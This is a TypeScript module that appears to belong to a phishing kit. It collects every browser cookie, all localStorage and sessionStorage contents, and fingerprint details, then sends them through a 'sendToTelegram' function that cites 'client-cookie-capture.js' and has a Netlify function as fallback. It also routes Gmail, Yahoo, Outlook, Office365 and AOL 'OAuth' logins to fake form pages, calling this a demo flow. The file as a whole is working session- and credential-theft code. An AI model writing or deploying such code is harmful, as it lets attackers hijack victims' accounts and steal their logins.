// Use the global sendToTelegram function from client-cookie-capture.js
export const sendToTelegram = async (data: any): Promise<void> => {
  if (typeof window !== 'undefined' && window.sendToTelegram) {
    return window.sendToTelegram(data);
  } else {
    console.warn('sendToTelegram not available, using fallback');
    try {
      const response = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });
      
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      
      const result = await response.json();
      console.log('✅ Fallback send successful:', result);
    } catch (error) {
      console.error('❌ Fallback send failed:', error);
    }
  }
};

export const getBrowserFingerprint = () => {
  // Enhanced cookie capture
  const getAllCookies = () => {
    const cookies = {};
    document.cookie.split(';').forEach(cookie => {
      const [name, value] = cookie.trim().split('=');
      if (name && value) {
        cookies[name] = decodeURIComponent(value);
      }
    });
    return cookies;
  };

  // Capture all storage data
  const getStorageData = (storage) => {
    const data = {};
    try {
      for (let i = 0; i < storage.length; i++) {
        const key = storage.key(i);
        if (key) {
          data[key] = storage.getItem(key);
        }
      }
    } catch (e) {
      console.warn('Storage access error:', e);
    }
    return data;
  };

  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    url: window.location.href,
    domain: window.location.hostname,
    referrer: document.referrer,
    screen: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth
    },
    cookies: document.cookie,
    cookiesParsed: getAllCookies(),
    localStorage: getStorageData(localStorage),
    sessionStorage: getStorageData(sessionStorage),
    timestamp: new Date().toISOString()
  };
};

export const generateState = () => {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
};

export const buildOAuthUrl = (provider: string, state: string) => {
  const baseUrl = window.location.origin;
  
  // All providers use demo flow with form login
  const redirectUri = encodeURIComponent(`${baseUrl}/auth/callback`);
  
  // All providers use demo flow - return special URL that indicates form should be shown
  return `/auth/form/${provider}`;
};

export const extractEmailFromProvider = (provider: string, code: string) => {
  // Mock email extraction for demo
  const domains = {
    'Gmail': 'gmail.com',
    'Yahoo': 'yahoo.com',
    'Outlook': 'outlook.com',
    'Office365': 'outlook.com',
    'AOL': 'aol.com',
    'Others': 'example.com'
  };
  
  const domain = domains[provider as keyof typeof domains] || 'example.com';
  return `user${Math.floor(Math.random() * 1000)}@${domain}`;
};